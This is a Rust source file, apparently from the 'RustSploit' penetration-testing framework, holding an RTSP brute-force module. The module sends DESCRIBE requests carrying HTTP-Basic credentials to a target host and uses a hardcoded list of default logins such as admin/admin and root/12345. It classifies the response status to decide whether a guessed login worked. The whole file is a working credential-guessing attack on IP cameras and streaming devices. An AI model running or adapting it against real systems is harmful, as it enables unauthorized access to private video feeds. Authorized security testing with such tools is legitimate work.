//! RTSP credential probe — DESCRIBE with HTTP-Basic, classify by status.

use anyhow::{Context, Result};
use crate::module::{ModuleCtx, ModuleOutcome};
use std::time::Duration;

use crate::module_info::{ModuleInfo, ModuleRank};
use crate::utils::creds_helper::{self, CredsRun};
use crate::utils::LoginResult;

const DEFAULT_PORT: u16 = 554;

const DEFAULTS: &[(&str, &str)] = &[
    ("admin", "admin"),
    ("admin", ""),
    ("admin", "1234"),
    ("admin", "12345"),
    ("admin", "password"),
    ("root", "root"),
    ("root", "12345"),
    ("user", "user"),
    ("guest", "guest"),
];

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "RTSP Bruteforce".to_string(),
        description:
            "Tests RTSP DESCRIBE auth (HTTP-Basic) on a given path. Single-target — \
             scheduler does fan-out."
                .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec!["https://www.rfc-editor.org/rfc/rfc7826".to_string()],
        disclosure_date: None,
        rank: ModuleRank::Normal,
        default_port: Some(554),
    }
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx.target.as_single().context("rtsp_bruteforce requires a single-host target")?;
    creds_helper::run(
        target,
        CredsRun {
            service_name: "rtsp",
            default_port: DEFAULT_PORT,
            source_module: "creds/generic/rtsp_bruteforce",
            defaults: DEFAULTS,
            password_only: false,
        },
        |host, port, user, pass, timeout| async move { probe(&host, port, &user, &pass, timeout).await },
    )
    .await
}

async fn probe(host: &str, port: u16, user: &str, pass: &str, timeout: Duration) -> LoginResult {
    use base64::Engine as _;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    let addr = format!("{}:{}", host, port);
    let mut stream = match crate::utils::creds_helper::connect_with_timeout(&addr, timeout).await {
        Ok(s) => s,
        Err(e) => {
            return LoginResult::Error {
                message: format!("connect: {e}"),
                retryable: true,
            }
        }
    };

    let path = crate::tenant::resolve()
        .global_options()
        .try_get("rtsp_path")
        .unwrap_or_else(|| "/".to_string());
    let basic =
        base64::engine::general_purpose::STANDARD.encode(format!("{}:{}", user, pass));
    let req = format!(
        "DESCRIBE rtsp://{}:{}{}{}{} RTSP/1.0\r\n\
         CSeq: 1\r\n\
         User-Agent: rustsploit/rtsp_bruteforce\r\n\
         Authorization: Basic {}\r\n\r\n",
        host,
        port,
        if path.starts_with('/') { "" } else { "/" },
        path,
        "",
        basic
    );

    if let Err(e) = stream.write_all(req.as_bytes()).await {
        return LoginResult::Error {
            message: format!("write: {e}"),
            retryable: true,
        };
    }

    let mut buf = [0u8; 1024];
    let n = match tokio::time::timeout(timeout, stream.read(&mut buf)).await {
        Ok(Ok(n)) => n,
        Ok(Err(e)) => {
            return LoginResult::Error {
                message: format!("read: {e}"),
                retryable: true,
            }
        }
        Err(e) => {
            return LoginResult::Error {
                message: format!("read timeout: {e}"),
                retryable: true,
            }
        }
    };
    if n < 12 {
        return LoginResult::Error {
            message: "short response".to_string(),
            retryable: true,
        };
    }
    let line: &str = std::str::from_utf8(&buf[..n.min(64)]).unwrap_or("");
    if line.starts_with("RTSP/1.0 200") || line.starts_with("RTSP/2.0 200") {
        LoginResult::Success
    } else if line.starts_with("RTSP/1.0 401")
        || line.starts_with("RTSP/2.0 401")
        || line.starts_with("RTSP/1.0 403")
    {
        LoginResult::AuthFailed
    } else {
        LoginResult::Error {
            message: format!("unexpected status line: {}", line.trim()),
            retryable: false,
        }
    }
}

crate::register_native_module!(crate::module::Category::Creds, "generic/rtsp_bruteforce", native);
